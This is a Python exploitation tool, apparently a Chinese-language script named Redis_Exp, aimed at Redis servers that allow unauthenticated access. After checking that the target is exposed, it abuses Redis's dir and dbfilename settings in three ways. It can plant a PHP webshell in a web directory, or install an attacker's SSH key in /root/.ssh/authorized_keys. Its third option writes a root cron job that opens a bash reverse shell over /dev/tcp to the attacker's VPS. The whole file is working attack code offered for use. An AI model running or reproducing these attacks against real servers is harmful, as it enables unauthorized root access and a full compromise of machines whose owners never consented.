#!/usr/bin/python
# coding=utf-8

import redis
from conf import *
from argparse import ArgumentParser


class Redis:
    def __init__(self):
        pass

    def check(self):
        '''验证是否存在未授权访问漏洞'''
        try:
            r = redis.StrictRedis(host=result.target_ip, port=6379, db=0, socket_timeout=2)
            r.info()
        except:
            print(f"[!]目标：{result.target_ip} 不存在未授权访问漏洞，程序退出...")
            return False
        else:
            print(f"[*]目标：{result.target_ip} 存在未授权访问漏洞")
            return r

    def webshell(self):
        if not result.shell_dir:
            print("[!]请使用-s指定要上传的shell")
            return
        r = self.check()
        if r:  # 当存在未授权时才会执行
            print(f"[+]正在向{PATH}写入webshell，请稍等...")
            # 打开shell文件路径，并保存为shell变量
            f = open(result.shell_dir, "r")
            shell = f.read()
            f.close()
            try:
                r.config_set('dir', PATH)
                r.config_set('dbfilename', 'redis.php')
                r.set('webshell', f'\r\n\r\n{shell}\r\n\r\n')
                r.save()
            except Exception as e:
                print("[!]Something Wrong!", e)
            else:
                print("[+]Getshell成功！请根据绝对路径连接webshell，shell文件名：redis.php")
            return

    def ssh_key(self):
        r = self.check()
        if r:  # 当存在未授权时才会执行
            print(f"[+]正在进行SSH私钥利用，请稍等...")
            # 打开私钥文件保存为变量
            f = open(SSH_KEY, 'r')
            ssh_key = f.read()
            f.close()
            try:
                r.set('crackit', ssh_key)
                r.config_set('dir', '/root/.ssh/')
                r.config_set('dbfilename', 'authorized_keys')
                r.save()
            except Exception as e:
                print("[!]Something Wrong!", e)
            else:
                print(f"[+]SSH私钥写入成功！请用私钥连接：ssh -i id_rsa root@{result.target_ip}")
            return

    def crontab(self):
        r = self.check()
        if r:  # 当存在未授权时才会执行
            try:
                r.set('x', f'\n* * * * * /bin/bash -i > /dev/tcp/{VPS_IP}/{VPS_PORT} 0<&1 2>&1\n')
                r.config_set('dir', '/var/spool/cron/')
                r.config_set('dbfilename', 'root')
                r.save()
            except:
                print("[!]Something Wrong!")
            else:
                print(f"[+]计划任务写入成功！请在你的vps：{VPS_IP} 监听：{VPS_PORT} 端口，等待shell回连！")
            return

    def run(self):
        if result.func == 'webshell':
            self.webshell()
        elif result.func == 'ssh-key':
            self.ssh_key()
        elif result.func == 'crontab':
            self.crontab()

def main():
    if not result.func:
        print("[!]请先使用-f指定要使用的功能：webshell(绝对路径写shell)/ssh-key(私钥登陆ssh)/crontab(计划任务反弹shell)")
        return
    else:  # 判断输入的func是否正确
        if result.func == 'webshell' or result.func == 'ssh-key' or result.func == 'crontab':
            Redis().run()
        else:
            print("[!]Input Error!请指定正确的功能：webshell(绝对路径写shell)/ssh-key(私钥登陆ssh)/crontab(计划任务反弹shell)")


if __name__ == '__main__':
    show = '''
      ____          _ _         _____            
     |  _ \ ___  __| (_)___    | ____|_  ___ __  
     | |_) / _ \/ _` | / __|   |  _| \ \/ / '_ \ 
     |  _ <  __/ (_| | \__ \   | |___ >  <| |_) |
     |_| \_\___|\__,_|_|___/___|_____/_/\_\ .__/ 
                          |_____|         |_|    
                                
                                  By PANDA墨森
    '''
    print(show + '\n')
    arg = ArgumentParser(description='Redis_Exp By PANDA墨森')
    arg.add_argument('target_ip', help='目标ip，eag：127.0.0.1')
    arg.add_argument('-f', help='可选的功能：webshell(绝对路径写shell)/ssh-key(私钥登陆ssh)/crontab(计划任务反弹shell)，会自动检测未授权漏洞', dest='func',type=str)
    arg.add_argument('-s', help='输入要上传的shell文件路径  eag：shell.php', dest='shell_dir', type=str)
    result = arg.parse_args()
    main()